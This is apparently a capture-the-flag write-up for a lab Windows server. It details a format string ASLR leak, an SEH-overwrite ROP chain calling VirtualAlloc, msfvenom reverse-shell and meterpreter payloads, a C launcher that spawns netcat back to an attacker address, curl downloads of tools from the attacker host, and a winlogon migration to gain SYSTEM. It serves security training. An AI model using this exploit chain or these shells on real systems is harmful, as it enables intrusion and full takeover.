# RainbowTwo

**OS:** Windows | **Difficulty:** Hard | **IP:** `<ip>`

## Overview
RainbowTwo is a Windows Server 2022 machine running a custom 32-bit file server (`filesrv.exe`) on port 2121. The server has both a format string vulnerability (leaking the ASLR base address) and a stack buffer overflow in its `sprintf` call. Exploitation requires an SEH overwrite with a ROP chain that calls `VirtualAlloc` to bypass DEP, leading to code execution as the `dev` service account. The unstable shell requires a custom-compiled launcher with `DETACHED_PROCESS` flags to maintain persistence. Privilege escalation abuses `SeDebugPrivilege` by migrating a meterpreter session into `winlogon.exe` to gain SYSTEM.

## Enumeration

### Port Scanning

**Command:**
```bash
nmap -sC -sV -p- <ip> -oN scans/full_tcp.txt
```

**Key results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | Microsoft ftpd | Anonymous login allowed |
| 2121 | Custom | filesrv.exe | Custom file sharing server |
| 3389 | RDP | MS Terminal Services | Windows Server 2022 (10.0.20348) |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 | Need credentials |

### Service Enumeration

**FTP (port 21):**

Anonymous login is allowed and reveals the server binary, a README, and a copy of the system's `kernel32.dll`:

```bash
ftp -n <ip>
> user anonymous anonymous
> ls
06-05-22  11:57AM               705536 filesrv.exe
06-05-22  02:43PM                  275 README.txt
06-09-22  05:36AM       <DIR>          SysWOW64
```

The README.txt says:
```
# FileSrv v0.2
Our simple file sharing server! Currently under development - we still seem
to have some minor problems with binary files.

Changelog:
 - After our last custom server got hacked we made sure to enable all
   mitigations: ASLR, DEP, GS! Now it's 100% secure.
```

Key takeaways: it's a 32-bit PE binary with ASLR, DEP, and stack cookies (GS) enabled. They also provide the remote `kernel32.dll` (in `SysWOW64/`) — a strong hint that we'll need it for ROP gadget addresses.

**FileSrv (port 2121):**

Connecting and testing commands reveals a simple text protocol:

```bash
# Available commands: GET, LST, PUT (unimplemented), HELP (unimplemented)
LST .
# Path: .
# C:\shared\filesrv.exe
# C:\shared\README.txt
# C:\shared\SysWOW64

GET README.txt
# Path: README.txt
# IyBGaWxl...  (base64-encoded file contents)
```

The server root is `C:\shared`. Path traversal with `..` is blocked ("Fishy path").

### What Stood Out

1. **Format string vulnerability**: Any command with a path argument passes user input directly to a `printf`-family function:
   ```
   LST %p-%p-%p-%p-%p
   ERROR: Can not open Path: DEADBEEF-3FA04120-3FA04120-00CFE7B4-00000000
   ```
   Position 2 leaks a `filesrv.exe` code pointer (`base + 0x14120`), defeating ASLR.

2. **Buffer overflow**: The server uses `sprintf(buf, "Path: %s", user_path)` into a 0x400 (1024) byte stack buffer. Paths longer than ~1018 bytes overflow past the buffer into the stack cookie, SEH chain, and return address. The crash at 1024 bytes of path data confirms the overflow.

3. **Binary analysis**: `checksec` shows ASLR + DEP + GS enabled, but SafeSEH is **disabled** (`SEHandlerTable=0, SEHandlerCount=0`). This opens the door for SEH overwrite attacks. The provided `kernel32.dll` enables calculating `VirtualAlloc` at runtime for DEP bypass.

## Foothold

### The Vulnerability

The custom file server `filesrv.exe` has two vulnerabilities:
- **Format string**: User-supplied path is used as a `printf` format string in the error handling code, allowing stack data leaks.
- **Stack buffer overflow**: `sprintf("Path: %s", user_path)` writes into a 1024-byte buffer with no bounds checking. Overflow corrupts the SEH handler chain.

Together these defeat ASLR (via the leak) and enable code execution (via SEH overwrite + ROP for DEP bypass).

### Exploitation — Step by Step

**Step 1: Leak the binary base address**

The format string vulnerability at position 2 leaks a pointer into the `.text` section at a fixed offset:

```python
r.sendline(b"LST %p-%p-%p-%p-%p")
# Response: ERROR: Can not open Path: XXXXXXXX-3FA04120-3FA04120-...
binary_base = int(leaks[1], 16) - 0x14120
```

**Step 2: Calculate gadget addresses**

With the binary base known, all ROP gadgets and IAT entries can be resolved. The key gadgets used:

| Gadget | Offset | Purpose |
|--------|--------|---------|
| `ret` | 0x01010 | Ret-slide for stability |
| `pop eax; ret` | 0x3711a | Load values |
| `sub eax, 0x8314c26b; ret` | 0x32ce4 | Compute values without null bytes |
| `xchg edi, eax; ret` | 0x48ca8 | Move values between regs |
| `mov ecx, edi; call esi` | 0x15638 | Set ecx via esi trampoline |
| `pushad; ret` | 0x113b1 | Push all regs to build VirtualAlloc frame |
| `jmp esp` | 0x11394 | Jump to shellcode after VirtualAlloc |
| `add esp, 0xe10; ret` | 0x11396 | Stack pivot (SEH handler) |

**Step 3: Resolve VirtualAlloc from kernel32.dll**

`VirtualAlloc` isn't directly imported, but `TlsAlloc` is (IAT at `base + 0x9013c`). Using the provided `kernel32.dll`, we calculate the offset between them:

```python
# TlsAlloc RVA: 0x19470, VirtualAlloc RVA: 0x16340
# Offset: VirtualAlloc - TlsAlloc = 0xFFFFCED0
# This offset is kernel32 version-dependent!
```

**Step 4: Build the ROP chain (pushad VirtualAlloc technique)**

The ROP chain sets up all registers for `VirtualAlloc(lpAddress, dwSize=1, flAllocationType=0x1000, flProtect=0x40)` then uses `pushad` to push them onto the stack as the call frame:

```python
rop  = p32(base + 0x01010) * 30          # ret-slide for crash offset stability

# Set flProtect = 0x40 (PAGE_EXECUTE_READWRITE)
rop += p32(base + 0x3711a)               # pop eax; ret
rop += p32(0x8314c2ab)                    # 0x8314c26b + 0x40
rop += p32(base + 0x32ce4)               # sub eax, 0x8314c26b → eax = 0x40

# Set up esi as trampoline, move 0x40 to edi, then ecx
rop += p32(base + 0x01068)               # pop esi; ret
rop += p32(base + 0x01068)               # esi = pop esi; ret
rop += p32(base + 0x48ca8)               # xchg edi, eax → edi = 0x40
rop += p32(base + 0x15638)               # mov ecx, edi; call esi → ecx = 0x40

# Set flAllocationType = 0x1000 (MEM_COMMIT)
rop += p32(base + 0x3711a)               # pop eax; ret
rop += p32(0x8314d26b)                    # 0x8314c26b + 0x1000
rop += p32(base + 0x32ce4)               # sub → eax = 0x1000
rop += p32(base + 0x3039f)               # mov edx, eax → edx = 0x1000
rop += p32(0x41414141)                    # junk for pop esi

# Set dwSize = 1
rop += p32(base + 0x0dc14)               # pop ebx; ret
rop += p32(0xffffffff)                    # -1 (avoid nulls)
rop += p32(base + 0x301e9)               # inc ebx → 0
rop += p32(base + 0x301e9)               # inc ebx → 1

# Set ebp = return address, esi = jmp eax
rop += p32(base + 0x0100f)               # pop ebp; ret
rop += p32(base + 0x0100f)               # ebp = pop ebp; ret
rop += p32(base + 0x01068)               # pop esi; ret
rop += p32(base + 0x14af9)               # esi = jmp eax

# Resolve VirtualAlloc: [TlsAlloc IAT] + offset
rop += p32(base + 0x15354)               # pop edi; ret
rop += p32(va_offset)                     # VirtualAlloc - TlsAlloc offset
rop += p32(base + 0x3711a)               # pop eax; ret
rop += p32(base + 0x9013c)               # &TlsAlloc IAT entry
rop += p32(base + 0x2bb8e)               # mov eax, [eax] → TlsAlloc addr
rop += p32(base + 0x113a8)               # add eax, edi → VirtualAlloc addr

# Set edi = ret (dummy for pushad)
rop += p32(base + 0x15354)               # pop edi; ret
rop += p32(base + 0x01010)               # edi = ret

# pushad builds the VirtualAlloc call frame, jmp esp runs shellcode
rop += p32(base + 0x113b1)               # pushad; ret
rop += p32(base + 0x11394)               # jmp esp
```

After `pushad`, the stack contains the VirtualAlloc arguments in the correct order. VirtualAlloc marks the stack as RWX, then `jmp esp` executes the shellcode that follows.

**Step 5: Assemble the payload**

```python
shellcode = b"\x90" * 16 + msfvenom_shellcode  # NOP sled + encoded shellcode

payload  = rop                                   # ROP chain
payload += b"A" * (0x408 - len(rop))             # Padding to SEH
payload += b"BBBB"                               # nSEH (junk)
payload += p32(base + 0x11396)                   # SEH handler: add esp, 0xe10; ret
payload += b"\x90" * 64                          # NOP sled
payload += shellcode                             # Reverse shell shellcode
payload += b"\x90" * (0xfb0 - len(payload))      # Pad to consistent size

r.sendline(b"LST " + payload)
time.sleep(2)    # CRITICAL: wait before closing so payload transfers completely
r.close()
```

Key details:
- The ret-slide (30x `ret` gadgets) absorbs variable crash offsets since the overflow is not perfectly stable
- The `add esp, 0xe10` stack pivot redirects execution from the exception handler context back into the ROP chain
- `sleep(2)` before `close()` is critical — without it the payload isn't fully transmitted
- Padding to `0xfb0` ensures consistent behavior across attempts
- The exploit is probabilistic and may need multiple attempts (~5-15 on average)

**Step 6: Generate shellcode**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=443 \
    -b '\x00\x09\x0a\x0b\x0c\x0d\x20\x25' \
    -e x86/shikata_ga_nai -n 16 -f raw
```

Bad characters: `\x00` (null terminates sprintf), `\x09-\x0d` (whitespace), `\x20` (space splits command), `\x25` (`%` triggers format string).

### Getting a Shell — The Stability Problem

The exploit fires and a `shell_reverse_tcp` connects back — but cmd.exe dies within ~500ms because it's a child of the corrupted filesrv.exe thread. When the thread terminates, all child processes are killed.

**Solution: Detached process launcher**

Compile a tiny C program that uses `CreateProcessA` with `DETACHED_PROCESS` flags to spawn nc.exe as a completely independent process:

```c
// launcher.c — cross-compile: i686-w64-mingw32-gcc launcher.c -o launcher.exe -static
#include <windows.h>
int main() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL,
        "C:\\shared\\n.exe 10.10.16.5 9002 -e cmd.exe",
        NULL, NULL, FALSE,
        CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

The exploitation chain becomes:

1. Run the buffer overflow exploit with `shell_reverse_tcp` shellcode (port 443)
2. Auto-catch the brief shell and immediately send: `curl <attacker>:9005/nc.exe -o C:\shared\n.exe`
3. Run the exploit again with `windows/exec` shellcode: `CMD=curl <attacker>:9005/launcher.exe -o C:\shared\l.exe & C:\shared\l.exe`
4. `launcher.exe` spawns `nc.exe` as a fully detached process → stable shell on port 9002

```bash
# Terminal 1 — stable shell listener
rlwrap nc -lvnp 9002

# Terminal 2 — run exploit
python3 do_exploit.py exec_launcher.bin
```

```
C:\shared>whoami
rainbow2\dev
```

### Flag
```bash
type C:\Users\dev\Desktop\user.txt
```
`<redacted>`

## Privilege Escalation (Root)

### Situation

We have a stable shell as `rainbow2\dev`, running as `NT AUTHORITY\SERVICE` at High Mandatory Level.

### Discovery

```
C:\shared>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

`SeDebugPrivilege` is the key — it allows debugging any process on the system, which means we can inject into SYSTEM-level processes like `winlogon.exe`.

### Exploitation

**Step 1: Upload meterpreter**

From the stable shell:
```
curl <attacker>:9005/s.exe -o C:\shared\s.exe
```

Where `s.exe` is a staged meterpreter payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=9001 -f exe -o s.exe
```

**Step 2: Set up msfconsole handler**

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 9001
run
```

**Step 3: Execute meterpreter from stable shell**

```
C:\shared>s.exe
```

Msfconsole receives the connection:
```
[*] Sending stage (190534 bytes) to <target>
[*] Meterpreter session 1 opened
```

**Step 4: Migrate to SYSTEM**

Use `SeDebugPrivilege` to migrate into `winlogon.exe` (runs as SYSTEM):

```
meterpreter > migrate -N winlogon.exe
[*] Migrating from 10724 to 628...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Flag
```bash
cat C:\Users\Administrator\Desktop\root.txt
```
`<redacted>`

## Key Takeaways

- **Format string + buffer overflow combo**: The format string leak defeats ASLR, enabling the buffer overflow exploitation with known gadget addresses. Always check for format string bugs in custom server implementations.
- **pushad VirtualAlloc technique**: An elegant way to set up a Windows API call via ROP — set all 8 registers to the right values, then `pushad` builds the entire call frame in one instruction.
- **Detached process for shell stability**: When exploiting thread-based servers, child processes die with the parent thread. Compiling a launcher with `CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS` flags creates truly independent processes that survive thread death. This is a reusable pattern for any Windows exploitation scenario with unstable threads.
- **sleep(2) matters**: Remote exploits need time for the full payload to be transmitted before the socket is closed. This was a critical fix that made the exploit reliable.
- **Ret-slide for variable offsets**: The 30x `ret` gadget sled at the start of the ROP chain absorbs the variable crash offset, making the exploit work despite the instability.

## Commands Quick Reference

```bash
# Recon
nmap -sC -sV -p- <ip>
ftp -n <ip>  # anonymous login, download filesrv.exe + kernel32.dll

# Foothold — format string leak + SEH overflow
python3 do_exploit.py exec_launcher.bin   # multiple attempts needed

# Upload tools via brief shell
curl <attacker>:9005/nc.exe -o C:\shared\n.exe
curl <attacker>:9005/launcher.exe -o C:\shared\l.exe

# Stable shell via detached launcher
C:\shared\l.exe   # spawns nc.exe -> connects to attacker:9002

# Privesc — SeDebugPrivilege
C:\shared\s.exe    # meterpreter stager
# In msfconsole:
migrate -N winlogon.exe
cat C:\Users\Administrator\Desktop\root.txt
```
